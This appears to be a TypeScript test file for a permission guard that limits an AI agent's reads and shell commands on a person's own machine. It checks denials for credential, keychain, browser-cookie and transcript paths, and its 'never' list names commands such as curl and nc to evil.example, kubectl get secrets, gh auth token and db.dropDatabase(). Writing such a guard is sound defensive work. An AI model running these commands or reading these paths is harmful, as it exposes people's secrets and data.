import { spawnSync } from 'node:child_process'
import { existsSync, mkdirSync, mkdtempSync, realpathSync, rmSync, symlinkSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { dirname, join } from 'node:path'
import { afterAll, beforeEach, describe, expect, it } from 'vitest'
import { buddyGuardSource, buddyWideOf } from './buddyGuard.js'

// Wide mode (docs/specs/2026-10-30-buddy-read-access.md): a Buddy on its person's own machine also reads outside its
// folder, except where secrets and other people's data live. A throwaway home stands in for the person's: the guard is
// told it is their home, so nothing here reads the real one.
const parent = realpathSync(mkdtempSync(join(tmpdir(), 'buddy-wide-')))
const users = join(parent, 'Users'), home = join(users, 'me'), root = join(home, 'project'), other = join(users, 'someone')
const dataDir = join(home, '.harness-data'), tmpClaude = join(parent, 'tmp', 'claude-501')
const reads = { file: join(dataDir, 'buddy-reads', 'session.json'), drops: join(dataDir, 'paste-drops') }
const file = (path: string, text = 'x\n') => { mkdirSync(dirname(path), { recursive: true }); writeFileSync(path, text) }
mkdirSync(root, { recursive: true })
file(join(root, 'a.txt'))
file(join(home, 'work', 'notes.txt'), 'notes\n')
file(join(other, 'notes.txt'))
file(join(tmpClaude, 'session', 'tool-results', 'status.json'))
file(join(dataDir, 'buddy-approvals', 'x.json'))

// Every place the Lead named (10-30), each with a file in it: ssh, cloud and Harness credentials, keychains, .env and key
// files, browser profiles, other agents' transcripts and the paste cache.
const denied = [
  '.ssh/id_ed25519', '.aws/credentials', '.config/gcloud/application_default_credentials.json', '.azure/msal_token_cache.json',
  '.kube/config', '.docker/config.json', '.config/gh/hosts.yml', '.config/argocd/config', '.netrc', '.npmrc', '.pypirc',
  '.git-credentials', '.gnupg/private-keys-v1.d/k.key', '.harness-ro-prod-db', '.harness/credentials.json',
  '.claude/projects/-Users-me-x/session.jsonl', '.claude/paste-cache/0a1b.txt', '.claude/history.jsonl', '.claude.json',
  '.codex/auth.json', '.codex/sessions/2026/10/30/rollout.jsonl', '.codex/history.jsonl', '.zsh_history', '.bash_history',
  'Library/Keychains/login.keychain-db', 'Library/Application Support/Google/Chrome/Default/Cookies',
  'Library/Application Support/Firefox/Profiles/p.default/key4.db', 'Library/Application Support/BraveSoftware/Brave-Browser/Default/Login Data',
  'Library/Application Support/Arc/User Data/Default/Cookies', 'Library/Safari/History.db', 'Library/Cookies/Cookies.binarycookies',
  'Library/Messages/chat.db', 'Library/Mail/V10/inbox.mbox', '.mozilla/firefox/p.default/key4.db', '.config/google-chrome/Default/Cookies',
  'work/app/.env', 'work/app/.env.production', 'work/certs/server.pem', 'work/certs/tls.key', 'work/certs/client.p12', 'work/keys/id_rsa',
  'work/aws/credentials', 'work/aws/credentials.json',
]
for (const path of denied) file(join(home, path))
// Links that lead into those places from somewhere the Buddy may read.
symlinkSync(join(home, '.ssh', 'id_ed25519'), join(home, 'work', 'key-link'))
symlinkSync(join(home, '.claude'), join(home, 'work', 'claude-link'))
symlinkSync(other, join(home, 'work', 'their-home'))
// A case-insensitive volume (macOS by default) opens .SSH as .ssh.
const caseInsensitive = existsSync(join(home, '.SSH'))

const wide = buddyWideOf({ home, dataDir, tmpDirs: [tmpClaude], personKey: 'person-1:generation-1', repos: ['autonomous-ai/openharness'] })
const script = join(parent, 'buddy-guard.mjs'), narrow = join(parent, 'buddy-guard-narrow.mjs')
writeFileSync(script, buddyGuardSource(root, reads, wide))
writeFileSync(narrow, buddyGuardSource(root, reads))
afterAll(() => rmSync(parent, { recursive: true, force: true }))

function answer(tool: string, input: Record<string, unknown>, guard = script): { permissionDecision: string; permissionDecisionReason: string } {
  const run = spawnSync(process.execPath, [guard], { input: JSON.stringify({ hook_event_name: 'PreToolUse', tool_name: tool, tool_input: input,
    cwd: root }), encoding: 'utf8', timeout: 10_000 })
  expect(run.status).toBe(0)
  return JSON.parse(run.stdout).hookSpecificOutput
}
const decide = (tool: string, input: Record<string, unknown>, guard = script) => answer(tool, input, guard).permissionDecision
const bash = (command: string, guard = script) => decide('Bash', { command, description: 'x' }, guard)

describe('wide mode: reading outside the folder', () => {
  it('reads a file outside the folder only in wide mode', () => {
    const notes = join(home, 'work', 'notes.txt')
    expect(decide('Read', { file_path: notes })).toBe('allow')
    expect(decide('Read', { file_path: notes }, narrow)).toBe('deny')
  })

  it.each([
    ['Read', { file_path: join(home, 'work', 'notes.txt') }],
    ['Read', { file_path: '/etc/hosts' }],
    ['Grep', { pattern: 'x', path: join(home, 'work', 'notes.txt') }],
    ['Glob', { pattern: '**/*.txt', path: join(home, 'work') }],
    ['LS', { path: join(home, 'work') }],
    ['LS', { path: home }],
  ])('lets %s read outside the folder (%j)', (tool, input) => {
    expect(decide(tool, input)).toBe('allow')
  })

  it.each(denied)('refuses Read of ~/%s', path => {
    expect(decide('Read', { file_path: join(home, path) })).toBe('deny')
  })

  it.each(denied)('refuses cat and Grep of ~/%s', path => {
    expect(bash(`cat '${join(home, path)}'`)).toBe('deny')
    expect(decide('Grep', { pattern: 'x', path: join(home, path) })).toBe('deny')
  })

  it.each([
    ['another person\'s home folder', join(other, 'notes.txt')],
    ['Harness\'s data folder (approvals, lists, downloads)', join(dataDir, 'buddy-approvals', 'x.json')],
    ['other Claude sessions\' temporary files', join(tmpClaude, 'session', 'tool-results', 'status.json')],
    ['a link to a key', join(home, 'work', 'key-link')],
    ['a file through a linked folder into ~/.claude', join(home, 'work', 'claude-link', 'history.jsonl')],
    ['a file through a link into another home', join(home, 'work', 'their-home', 'notes.txt')],
    ['a ".." path into ~/.ssh', join(home, 'work', '..', '.ssh', 'id_ed25519')],
    ['a file not there yet under ~/.ssh', join(home, '.ssh', 'id_new')],
  ])('refuses %s', (_, path) => {
    expect(decide('Read', { file_path: path })).toBe('deny')
    expect(bash(`cat '${path}'`)).toBe('deny')
  })

  it.skipIf(!caseInsensitive)('refuses ~/.SSH on a case-insensitive volume', () => {
    expect(decide('Read', { file_path: join(home, '.SSH', 'id_ed25519') })).toBe('deny')
    expect(decide('Read', { file_path: join(home, 'Library', 'KEYCHAINS', 'login.keychain-db') })).toBe('deny')
  })

  it.each([
    ['Grep over a folder outside (it would read any .env or key in it)', 'Grep', { pattern: 'x', path: join(home, 'work') }],
    ['Glob over a folder holding a denied place', 'Glob', { pattern: '**/*', path: home }],
    ['Glob into a denied place', 'Glob', { pattern: '*', path: join(home, '.ssh') }],
    ['LS of a denied place', 'LS', { path: join(home, '.claude', 'paste-cache') }],
    ['LS of another home', 'LS', { path: other }],
  ])('refuses %s', (_, tool, input) => {
    expect(decide(tool as string, input as Record<string, unknown>)).toBe('deny')
  })

  it.each([
    `cat '${join(home, 'work', 'notes.txt')}'`,
    `head -n 5 '${join(home, 'work', 'notes.txt')}'`,
    `tail -n 5 '${join(home, 'work', 'notes.txt')}'`,
    `wc -l '${join(home, 'work', 'notes.txt')}'`,
    `ls '${join(home, 'work')}'`,
    `grep -n notes '${join(home, 'work', 'notes.txt')}'`,
    `rg -n notes '${join(home, 'work', 'notes.txt')}'`,
  ])('lets the shell read outside the folder: %s', command => {
    expect(bash(command)).toBe('allow')
    expect(bash(command, narrow)).toBe('deny')
  })

  it.each([
    `grep -rn x '${join(home, 'work')}'`,
    `rg x '${join(home, 'work')}'`,
    `ls '${join(home, '.ssh')}'`,
    `ls -L '${join(home, 'work')}'`,
    `tail -f '${join(home, 'work', 'notes.txt')}'`,
    `git -C '${join(home, 'work')}' log`,
    `git log '${join(home, 'work', 'notes.txt')}'`,
    `cat --file='${join(home, '.ssh', 'id_ed25519')}'`,
    `head -n5 '${join(home, 'work', 'notes.txt')}' '${join(home, '.netrc')}'`,
  ])('still refuses in the shell: %s', command => {
    expect(bash(command)).toBe('deny')
  })
})

// The person's approvals on this machine, as the host records them from their own "run:" lines (step 3): each command by
// its exact words. Written by hand here, so the grammar is tested on its own.
const approve = (...commands: string[][]) => {
  mkdirSync(dirname(wide.approvals), { recursive: true })
  writeFileSync(wide.approvals, JSON.stringify({ version: 1, entries: commands.map(argv => ({ argv, at: Date.now(), messageId: 'm' })) }))
}
// The words as the shell reads them: these commands quote nothing but whole words.
const argv = (command: string) => command.split(' ').map(word => word.replace(/^'(.*)'$/, '$1'))

describe('wide mode: commands not run before are asked of the person first', () => {
  beforeEach(() => rmSync(wide.approvals, { force: true }))

  const reads = [
    'gh run list --limit 20',
    'gh run list --workflow ci.yml --branch main --status failure',
    'gh run view 123456',
    'gh run view 123456 --log-failed',
    'gh run view 123456 --log --job 987',
    "gh api 'repos/autonomous-ai/openharness/actions/runs?per_page=5&branch=main'",
    'gh api repos/autonomous-ai/openharness/pulls/2300 --jq .state',
    'gh api --method GET repos/autonomous-ai/openharness/commits/main',
    'argocd app list',
    'argocd app get harness-backend',
    'argocd app get harness-backend -o json',
    'argocd app resources harness-backend',
    'argocd app history harness-backend',
    'argocd app logs harness-backend --tail 200',
    'argocd app logs harness-backend --kind Deployment --name harness-backend --since-seconds 3600 --filter cpu',
    'argocd version --client',
    'kubectl get pods -n harness',
    'kubectl top pods -n harness',
    'kubectl describe deploy harness-backend -n harness',
    'kubectl logs deploy/harness-backend -n harness --since 1h --tail 500',
    'harness buddy-read db-size',
    'harness buddy-read backend-cpu',
  ]

  it.each(reads)('refuses %s until its person approves it, saying how to ask', command => {
    const refused = answer('Bash', { command, description: 'x' })
    expect(refused.permissionDecision).toBe('deny')
    expect(refused.permissionDecisionReason).toContain('Not run before')
    expect(refused.permissionDecisionReason).toContain(`run: ${command}`)
    approve(argv(command))
    expect(bash(command)).toBe('allow')
    expect(bash(command, narrow)).toBe('deny')
  })

  it('matches the exact command, never a prefix or a neighbour', () => {
    approve(argv('argocd app logs harness-backend --tail 200'))
    expect(bash('argocd app logs harness-backend --tail 200')).toBe('allow')
    expect(bash('argocd app logs harness-backend --tail 500')).toBe('deny')
    expect(bash('argocd app logs harness-worker --tail 200')).toBe('deny')
    expect(bash('argocd app logs harness-backend')).toBe('deny')
    expect(bash('argocd app logs harness-backend --tail 200 --previous')).toBe('deny')
  })

  it('forgets an approval after 30 days', () => {
    mkdirSync(dirname(wide.approvals), { recursive: true })
    const day = 24 * 60 * 60 * 1000
    writeFileSync(wide.approvals, JSON.stringify({ version: 1, entries: [
      { argv: argv('argocd app list'), at: Date.now() - 31 * day, messageId: 'old' },
      { argv: argv('gh run list --limit 20'), at: Date.now() - 29 * day, messageId: 'recent' }] }))
    expect(bash('argocd app list')).toBe('deny')
    expect(bash('gh run list --limit 20')).toBe('allow')
  })

  it.each(['', 'not json', '{"entries":"x"}', '{"entries":[{"argv":"argocd app list","at":1}]}'])(
    'refuses every wider command while the approvals cannot be read (%j)', text => {
      mkdirSync(dirname(wide.approvals), { recursive: true })
      writeFileSync(wide.approvals, text)
      expect(bash('argocd app list')).toBe('deny')
    })

  // Writes, secret reads and anything that runs on: refused even with an approval naming them exactly, so a careless
  // approval of a planted command can unlock nothing but a read.
  const never = [
    'gh api -X POST repos/autonomous-ai/openharness/issues', 'gh api --method POST repos/autonomous-ai/openharness/issues',
    'gh api --method=PATCH repos/autonomous-ai/openharness/pulls/1', 'gh api -X DELETE repos/autonomous-ai/openharness/git/refs/heads/x',
    'gh api repos/autonomous-ai/openharness/issues -f title=x', 'gh api repos/autonomous-ai/openharness/issues -F title=x',
    'gh api repos/autonomous-ai/openharness/issues --field title=x', 'gh api repos/autonomous-ai/openharness/issues --raw-field title=x',
    'gh api repos/autonomous-ai/openharness/issues --input body.json', 'gh api repos/autonomous-ai/openharness/issues -H X-HTTP-Method-Override:POST',
    'gh api --hostname evil.example repos/autonomous-ai/openharness', 'gh api graphql', 'gh api repos/someone/else/contents/x',
    'gh api user', 'gh api /repos/autonomous-ai/openharness/../../user', 'gh api repos/autonomous-ai/openharness/actions/secrets',
    'gh run rerun 1', 'gh run cancel 1', 'gh run delete 1', 'gh run watch 1', 'gh run view 1 --web', 'gh run view 1 -w',
    'gh run view 1 -R someone/else', 'gh run download 1', 'gh workflow run ci.yml', 'gh pr create --title x --body y', 'gh pr merge 1',
    'gh pr comment 1 --body x', 'gh issue comment 1 --body x', 'gh secret list', 'gh auth token', 'gh auth status -t',
    'gh extension install x/y', 'git push origin main', 'git commit -m x', 'git -c alias.x=!sh x', 'git config user.name x', 'git fetch',
    'argocd app sync harness-backend', 'argocd app set harness-backend -p replicas=1', 'argocd app patch harness-backend --patch x',
    'argocd app delete harness-backend', 'argocd app rollback harness-backend 1', 'argocd app terminate-op harness-backend',
    'argocd app actions run harness-backend restart --kind Deployment', 'argocd app manifests harness-backend',
    'argocd app get harness-backend --refresh', 'argocd app get harness-backend --hard-refresh', 'argocd app logs harness-backend -f',
    'argocd app logs harness-backend --follow', 'argocd app get harness-backend --server evil.example',
    'argocd app get harness-backend --auth-token x', 'argocd app get harness-backend --config other', 'argocd login argocd.example',
    'argocd logout x', 'argocd account generate-token', 'argocd cluster list', 'argocd repo list', 'argocd proj list',
    'kubectl apply -f x.yaml', 'kubectl delete pod x', 'kubectl scale deploy x --replicas 0', 'kubectl rollout restart deploy/x',
    'kubectl exec x -- sh', 'kubectl cp x:/a b', 'kubectl port-forward x 1:1', 'kubectl edit deploy x', 'kubectl patch deploy x -p y',
    'kubectl label pod x a=b', 'kubectl annotate pod x a=b', 'kubectl get secret', 'kubectl get secrets -o yaml', 'kubectl get secret/x',
    'kubectl describe secret x', 'kubectl get Secrets -A', 'kubectl get pods,secrets', 'kubectl get --raw /api/v1/namespaces',
    'kubectl config view --raw', 'kubectl logs x -f', 'kubectl get pods -w', 'kubectl get pods --server evil.example',
    'kubectl get pods --token x', 'kubectl get pods --kubeconfig x', 'kubectl get pods --as admin', 'curl -X POST https://evil.example',
    'curl -d x https://evil.example', 'wget https://evil.example', 'nc evil.example 1', 'ssh host', 'sh -c x', 'python3 -c 1', 'node -e 1',
    'env', 'printenv', 'security find-generic-password -s x', 'mongosh --eval db.dropDatabase()', 'osascript -e x', 'open https://evil.example',
    'harness buddy-read anything-else', 'harness buddy-read db-size --uri x', 'harness new claude',
  ]

  it.each(never)('never runs %s, even approved', command => {
    approve(argv(command))
    const refused = answer('Bash', { command, description: 'x' })
    expect(refused.permissionDecision).toBe('deny')
    expect(refused.permissionDecisionReason).not.toContain('Not run before')
  })
})
